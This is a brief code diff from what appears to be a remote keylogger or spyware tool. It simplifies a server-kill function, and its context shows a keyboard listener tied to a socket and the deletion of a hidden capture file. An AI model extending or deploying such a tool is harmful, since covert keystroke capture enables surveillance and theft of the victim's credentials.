@@ -23,11 +23,10 @@ def launch_keylogger(mysocket):
     return keylogger.listen_keyboard(mysocket)
 
 def kill_server():
-    if os.name == "nt":
-        os._exit(1)
-    else:
-        p = psutil.Process(os.getpid())
-        p.terminate()
+    p = psutil.Process(os.getpid())
+    p.terminate()
+
+    
 def stop_and_delete_capture_file():
     file = ".document1.txt" 
     os.remove(file)
